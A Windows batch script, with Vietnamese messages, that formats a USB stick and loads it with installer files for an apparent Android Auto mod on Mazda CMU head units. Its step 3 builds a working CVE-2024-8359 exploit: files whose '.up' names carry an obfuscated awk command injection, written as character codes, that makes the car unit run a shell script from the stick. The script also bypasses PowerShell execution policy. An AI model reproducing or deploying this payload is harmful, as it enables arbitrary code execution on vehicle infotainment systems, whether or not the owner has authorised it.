@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul
title Tao USB Cai Dat oem-aa-mod cho Mazda CMU

echo ==========================================================
echo   CÔNG CỤ TẠO USB CÀI ĐẶT OEM-AA-MOD (MAZDA CMU)
echo   Tham khao: ilshyma/mazda-hud-toolkit (CVE-2024-8359)
echo ==========================================================
echo.

where powershell >nul 2>&1
if errorlevel 1 (
  echo LỖI: Máy tính của bạn không tìm thấy powershell.exe.
  pause
  exit /b 1
)

:: Kiểm tra quyền Admin
net session >nul 2>&1
if %errorlevel%==0 (set "IS_ADMIN=1") else (set "IS_ADMIN=0")

echo Đang quét các ổ USB gắn ngoài...
echo.

set "PSOUT=%TEMP%\mzd_disks.txt"
del /q "%PSOUT%" 2>nul
powershell -NoProfile -ExecutionPolicy Bypass -Command "$rows = Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=2' | ForEach-Object { $lbl = if ($_.VolumeName) { $_.VolumeName } else { '(Không tên)' }; '{0}|{1}|{2:N1} GB' -f $_.DeviceID, $lbl, ($_.Size/1GB) }; if (-not $rows) { $rows = Get-Disk | Where-Object { $_.BusType -eq 'USB' } | Get-Partition | Get-Volume | Where-Object { $_.DriveLetter } | ForEach-Object { $lbl = if ($_.FileSystemLabel) { $_.FileSystemLabel } else { '(Không tên)' }; '{0}:|{1}|{2:N1} GB' -f $_.DriveLetter, $lbl, ($_.Size/1GB) } }; $rows | Out-File -Encoding ASCII '%PSOUT%'" 2>nul

if not exist "%PSOUT%" (
  echo LỖI: Không thể quét ổ đĩa qua PowerShell.
  pause
  exit /b 1
)

set /a N=0
for /f "usebackq tokens=1,2,3 delims=|" %%a in ("%PSOUT%") do (
  set /a N+=1
  set "DRIVE_!N!=%%a"
  set "LABEL_!N!=%%b"
  set "SIZE_!N!=%%c"
  echo   !N!  %%a  ^(%%b - %%c^)
)
del /q "%PSOUT%" 2>nul

if !N!==0 (
  echo Không tìm thấy ổ USB nào! Vui lòng cắm USB và chạy lại script.
  pause
  exit /b 1
)

echo   0  Hủy bỏ
echo.
set "CH="
set /p "CH=Chọn số thứ tự ổ USB cần format: "
if "!CH!"=="" exit /b 0
if "!CH!"=="0" exit /b 0

set "TARGET=!DRIVE_%CH%!"
if "!TARGET!"=="" (echo Lựa chọn không hợp lệ! & pause & exit /b 1)
set "TARGET_BS=!TARGET!\"

echo.
echo CẢNH BÁO: Toàn bộ dữ liệu trên !TARGET! (!LABEL_%CH%!, !SIZE_%CH%!) SẼ BỊ XOÁ SẠCH!
set "OK="
set /p "OK=Xác nhận format FAT32 với tên MZD? [y/N]: "
if /I not "!OK!"=="y" (echo Đã hủy. & exit /b 0)

echo.
echo [1/4] Đang format !TARGET! thành FAT32 / MZD...
set "FMT_MODE=manual"
if "!IS_ADMIN!"=="1" (
  set "FMT_LETTER=!TARGET:~0,1!"
  powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Format-Volume -DriveLetter '!FMT_LETTER!' -FileSystem FAT32 -NewFileSystemLabel 'MZD' -Confirm:$false -Force | Out-Null; 'OK' } catch { 'FAIL' }" > "%TEMP%\mzd_fmt.txt" 2>&1
  findstr /B /L "OK" "%TEMP%\mzd_fmt.txt" >nul
  if not errorlevel 1 set "FMT_MODE=done"
  del /q "%TEMP%\mzd_fmt.txt" 2>nul
)

if not "!FMT_MODE!"=="done" (
  echo Vui lòng format thủ công: Chuột phải vào ổ !TARGET! trong Windows Explorer -^> Format...
  echo   File system: FAT32, Volume label: MZD, Quick Format: Tích chọn.
  pause
)

set SCRIPT_DIR=%~dp0
set REPO_ROOT=%SCRIPT_DIR%..\..\

echo.
echo [2/4] Đang sao chép các file cài đặt vào !TARGET_BS!...
copy /Y "%SCRIPT_DIR%jci-autoupdate" "!TARGET_BS!" >nul
copy /Y "%SCRIPT_DIR%dataRetrieval_config.txt" "!TARGET_BS!" >nul
copy /Y "%SCRIPT_DIR%t" "!TARGET_BS!" >nul
copy /Y "%SCRIPT_DIR%h" "!TARGET_BS!" >nul
copy /Y "%SCRIPT_DIR%s" "!TARGET_BS!" >nul
copy /Y "%SCRIPT_DIR%tweaks.sh" "!TARGET_BS!" >nul
copy /Y "%SCRIPT_DIR%run.sh" "!TARGET_BS!" >nul
copy /Y "%SCRIPT_DIR%run-aa.sh" "!TARGET_BS!" >nul
copy /Y "%SCRIPT_DIR%run-carplay.sh" "!TARGET_BS!" >nul
copy /Y "%SCRIPT_DIR%mp3title.txt" "!TARGET_BS!" >nul

mkdir "!TARGET_BS!mp3" 2>nul
mkdir "!TARGET_BS!js" 2>nul
xcopy /E /I /Y "%SCRIPT_DIR%mp3\*" "!TARGET_BS!mp3\" >nul
xcopy /Y "%SCRIPT_DIR%mp3\*.mp3" "!TARGET_BS!" >nul
xcopy /E /I /Y "%SCRIPT_DIR%js\*" "!TARGET_BS!js\" >nul

mkdir "!TARGET_BS!resources" 2>nul
if exist "%REPO_ROOT%resources\" (
  xcopy /E /I /Y "%REPO_ROOT%resources\*" "!TARGET_BS!resources\" >nul
)

for /r "%REPO_ROOT%" %%f in (libpatch-*.so) do (
  copy /Y "%%f" "!TARGET_BS!" >nul 2>nul
)

echo.
echo [3/4] Đang tạo payload CVE-2024-8359 (.up filename command injection)...
powershell -NoProfile -ExecutionPolicy Bypass -Command "$d='!TARGET_BS!'; $q=[char]39; $m='$^(' + 'awk -v f=%%c ' + $q + 'BEGIN{s=f f f f f f f f f f f f f f f f f f f;system^(sprintf^(s,115,104,32,47,109,110,116,47,115,100,91,97,98,99,100,93,49,47,116^)^)}' + $q + '^).up'; $t='$^(' + 'awk -v f=%%c ' + $q + 'BEGIN{s=f f f f f f f f f f f f f f f f f f f f f f f;system^(sprintf^(s,115,104,32,47,116,109,112,47,109,110,116,47,115,100,91,97,98,99,100,93,49,47,116^)^)}' + $q + '^).up'; New-Item -ItemType File -Path (Join-Path $d $m) -Force | Out-Null; New-Item -ItemType File -Path (Join-Path $d $t) -Force | Out-Null"

echo.
echo ==========================================================
echo  TẠO USB CÀI ĐẶT THÀNH CÔNG!
echo  Bạn có thể tháo USB và mang ra xe cắm vào cổng USB 1.
echo ==========================================================
pause
